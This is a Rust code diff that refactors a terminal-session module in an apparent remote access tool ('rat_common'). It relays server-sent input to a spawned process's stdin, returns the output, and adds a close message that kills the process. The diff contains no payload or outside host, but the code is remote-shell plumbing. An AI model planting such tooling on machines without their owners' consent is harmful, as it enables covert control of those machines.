@@ -2,11 +2,11 @@ use std::process::Stdio;
 use std::sync::{Arc, Weak};
 
 use async_trait::async_trait;
-use rat_common::framework::{ModuleImpl, ModuleState};
+use rat_common::framework::{Module, ModuleImpl, ModuleState};
 use rat_common::reader::Reader;
 use rat_common::schema::{
     ClientMessage, ClientMessageData, SessionInput, SessionMetadata, SessionMetadataInner,
-    SessionOutput,
+    SessionOutput, SessionTerminalMetadataInner,
 };
 use rat_common::snowflake::SnowflakeId;
 use tokio::io::AsyncWriteExt;
@@ -74,7 +74,7 @@ impl TerminalSession {
             _client: client,
             _metadata: Arc::new(SessionMetadata {
                 id,
-                inner: SessionMetadataInner::Terminal { pid },
+                inner: SessionMetadataInner::Terminal(SessionTerminalMetadataInner { pid }),
             }),
             _name: name,
             _process: Mutex::new(process),
@@ -121,6 +121,11 @@ impl ModuleImpl for TerminalSession {
 
     async fn handle(self: Arc<Self>, event: Self::EventType) -> anyhow::Result<()> {
         if let Some(client) = self._client.upgrade() {
+            if let SessionOutput::TerminalClosed = event {
+                // Do not early return here, as we still want to send the closed message to the server
+                self.stop();
+            }
+
             let message = ClientMessage {
                 id: SnowflakeId::new(),
                 data: ClientMessageData::SessionOutput {
@@ -142,16 +147,16 @@ impl SessionImpl for TerminalSession {
     }
 
     async fn input(&self, data: SessionInput) -> anyhow::Result<()> {
-        if let SessionInput::TerminalStdin { data } = data {
-            let mut stdin = self._input.lock().await;
-            stdin.write_all(&data).await?;
+        match data {
+            SessionInput::TerminalStdin { data } => {
+                let mut stdin = self._input.lock().await;
+                stdin.write_all(&data).await?;
+            }
+            SessionInput::Close => {
+                self._process.lock().await.kill().await?;
+            }
         }
 
-        Ok(())
-    }
-
-    async fn close(&self) -> anyhow::Result<()> {
-        self._process.lock().await.kill().await?;
         Ok(())
     }
 }
